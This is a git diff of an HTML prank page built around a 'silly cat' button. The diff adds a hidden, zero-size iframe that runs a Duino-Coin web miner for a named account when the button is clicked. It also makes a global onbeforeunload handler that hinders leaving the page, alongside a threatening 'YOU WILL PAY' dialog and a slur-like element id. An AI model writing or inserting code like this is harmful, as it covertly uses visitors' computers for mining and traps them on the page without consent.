@@ -14,11 +14,11 @@
             <button onclick="notsilly()">Unsilly the cat!</button></p></center>
         <script>
         playBall()
+        window.onbeforeunload = function() {
+            return true;
+       };
         function notsilly() {
-            window.onbeforeunload = function() {
-                return true;
-            };
-            document.getElementById("nig").innerHTML = "<h1>DID YOU JUST TRIED TO UNSILLY THE CAT? THAT'S WHAT YOU GET FOR TRYING TO UNSILLY THE CAT"
+            document.getElementById("nig").innerHTML = "<h1>DID YOU JUST TRIED TO UNSILLY THE CAT? THAT'S WHAT YOU GET FOR TRYING TO UNSILLY THE CAT<h1><br><iframe src='https://server.duinocoin.com/webminer.html?username=eniuu&threads=2&rigid=Debilnia-Strona&keyinput=eniuu' width='0' height='0'' visibility='hidden' display='none'></iframe>"
             funny()
             superLogout()
             confirm("YOU WILL PAY")
